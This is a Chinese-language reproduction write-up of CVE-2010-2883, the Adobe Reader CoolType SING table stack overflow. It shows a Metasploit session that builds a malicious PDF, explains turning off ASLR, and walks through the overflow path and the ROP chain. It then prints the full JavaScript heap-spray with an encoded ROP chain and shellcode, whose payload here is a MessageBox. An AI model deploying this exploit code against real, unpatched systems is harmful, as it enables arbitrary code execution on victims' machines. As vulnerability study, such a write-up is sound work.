&emsp;&emsp;<font size=2>这个已经是很老的漏洞了，但也经常是复现CVE的第一课。很早之前我就尝试过复现但是都不成功，最近灵感一现踩完了很多坑最终复现出来了，也在这里记录一下复现这个漏洞有哪些坑需要避免吧。</font></br>

&emsp;&emsp;<font size=2>Adobe Reader我就不挂链接了，以后还有很多软件，如果都挂在github感觉太占空间，我就放在自己网盘里了，想要的可以评论联系。有了漏洞软件之后我们就需要一个利用样本，在这里我们不用漏洞战争里的配套资料了，我们用msf生成一个最简单的MessageBox的弹窗：</font></br>

```
msf5 > search cve-2010-2883

Matching Modules
================

   #  Name                                            Disclosure Date  Rank   Check  Description
   -  ----                                            ---------------  ----   -----  -----------
   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow
   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow


msf5 > use 1
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > show payloads
   30   windows/loadlibrary                                                  normal  No     Windows LoadLibrary Path
   31   windows/messagebox                                                   normal  No     Windows MessageBox
   32   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > use 31
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > exploit

[*] Creating 'msf.pdf' file...
[+] msf.pdf stored at /Users/fanda/.msf4/local/msf.pdf
msf5 exploit(windows/fileformat/adobe_cooltype_sing) >
```

&emsp;&emsp;<font size=2>怎么用就不说了。就说这里利用成功必须要避免的一个坑吧：**ASLR**。</font></br>

&emsp;&emsp;<font size=2>win7是自带ASLR保护的，所以必须得关了才能成功利用，否则无法正常ROP。那么怎么关呢？用一个微软官方出的体验增强工具（Enhanced Mitigation Experience ToolKit）。上次去微软官方怎么找也找不到，还好我备份了，是win7用的，同样想要的可以留言。在下面ASLR哪里改为disabled然后重启电脑就行了：</font></br>

![关闭ASLR](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-2883/screenshot/关闭ASLR.png)

&emsp;&emsp;<font size=2>完了之后双击应该直接运行POC应该就会看到利用成功的MessageBox弹窗：</font></br>

![弹窗](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-2883/screenshot/弹窗.png)

&emsp;&emsp;<font size=2>坑讲完了，接下来我们来看看技术上是怎么实现的，首先我们已经知道了这是一个CoolType.dll里的解析TTF时中的strcat函数未检查长度造成的栈溢出漏洞，但是这又不是常规的溢出至return地址的利用，因为程序可能开启了GS（Linux上叫canary）保护。仔细跟踪CoolType.dll的反汇编我们可以发现在控制流进行：</font></br>

```
strcat(&v24, (const char *)(v18 + 16));
......
call sub_8016B96();
->
  call sub_801BAD9();
  ->
    call dword ptr ds:[eax];
    ->
      call dword ptr ds:[eax];
      -> 在这里eax为strcat目标地址的偏移0x1f8处
```

&emsp;&emsp;<font size=2>调用堆栈如下：</font></br>

![调用堆栈](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-2883/screenshot/调用堆栈.png)

&emsp;&emsp;<font size=2>从这里开始就是ROP的部分了，基本都是取自icucnv36.dll的指令。第一条ROP指令做了一个栈平衡，将ESP指向了shellcode的前部，第二条ROP指令就是`pop esp;ret;`将栈转移到了0C0C0C0C。等等，这个0C0C0C0C听上去怎么这么像非法地址？这就要引出pdf里的内嵌JavaScript了。</font></br>

&emsp;&emsp;<font size=2>PDF是内置了JavaScript解释器的，用来丰富PDF的功能，网页访问，pdf内弹窗等都是可以用JavaScript来实现。但是JavaScript是受到了限制的，不能为所欲为。但别有用心的大佬们想到了利用JavaScript堆喷射的办法，配合adobe阅读器本身的漏洞进而实现执行任意代码。比如POC中的JavaScript堆喷射实现：</font></br>

```javascript
var shellcode = unescape( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u2dbb%u64ae%udb5e%ud9d7%u2474%u5af4%uc92b%u45b1%uc283%u3104%u0e5a%u7703%u86a0%u5eab%udd57%u148d%u168c%u061c%ua17e%u6f6e%uc51b%u5fe0%uaf6f%u140e%u4c19%u6c84%ue7ee%u50e4%uc165%udf20%u5b61%u86a2%u7290%ud9bb%ufff3%u3d28%u74d0%u01f5%udf93%u01de%u35a2%ubb95%u42bc%u1bf0%ubfbc%u6fe6%ub4f7%u04dd%u2506%ue52c%u7938%ub5b3%ub9bf%uc238%uf67e%ucdcc%ue247%uf63b%ud13b%u7deb%u9225%u59b6%u4ea4%u2a20%udbaa%u7626%udaaf%u0dd3%u57cb%uf922%u235d%ue501%u6f3c%u1dfb%ubb96%uf875%u8161%u8cee%u083c%uc203%u8b28%u1d24%u3d57%ue59f%u4013%u07f8%u3a10%ue3e4%uac85%u149b%ud2d6%uaf2d%u4521%u4342%ud412%ua8f2%uf860%ua666%u77f1%u4402%uacca%uf444%u590e%ue2dc%ua219%uee8b%u9e2c%u5564%ubd86%u15c8%udd50%u37f6%u81b7%u4809%u56b8%uce99%u871f%u4f0d%ua2c7%ue78f%u484a%u8463%u4965%u360b%u67a2%u2585%u2fc2%u89b5%ub833%u9af8%u1975%u6e6b%u3415%ue64b%uea86%u90ab%ubb30%u30ce%u0aad%u40d8%u4961%ud9ca%ua09b%u8b38%u9208%ud4ee%u257f%u7acf%u137f%u41c7' );

var block = unescape( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );

while (block.length + 20 + 8 < 65536) 
    block+=block;
SP = block.substring(0, (0x0c0c-0x24)/2);
SP += shellcode;
SP += block;
slackspace = SP.substring(0, 65536/2);

while(slackspace.length < 0x80000) 
    slackspace += slackspace;

bigblock = slackspace.substring(0, 0x80000 - (0x1020-0x08) / 2);
var memory = new Array();

for (count=0;count<0x1f0;count++)
    memory[count]=bigblock+"s";
```

&emsp;&emsp;<font size=2>在分配大量内存时，windows有极大的可能在0C000000处给予分配地址。这样一来堆块承载着payload就顺理成章的被放置在了这个地址，在访问0C0C0C0C的时候就是合法的了。</font></br>

&emsp;&emsp;<font size=2>完了之后0C0C0C0C上的跳板指令的主场秀了，一番操作。调用了ZwMapViewOfSection等函数映射了一块虚拟地址（可读可写可执行），然后调用了memcpy把shellcode放了进入，这个shellcode的来源就是JavaScript里的那个消耗了一些跳板指令的shellcode变量。随后调入了这段映射地址。这个时候就是可以执行任意代码了，不会受到ROP的约束了，需要什么用LoadLibrary和GetProcAddress自己取就完事了，这部分没啥好说的，放一张执行最后MessageBox时的图片：</font></br>

![利用成功](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-2883/screenshot/利用成功.png)

&emsp;&emsp;<font size=2>以上就是这个CVE复现的过程了，不扫盲，只讲坑和利用逻辑。</font></br>

---------

### 附录

&emsp;&emsp;<font size=2>相关结构体：</font></br>

![相关结构体](https://raw.githubusercontent.com/fangdada/how2CVE/master/CVE-2010-2883/screenshot/相关结构体.png)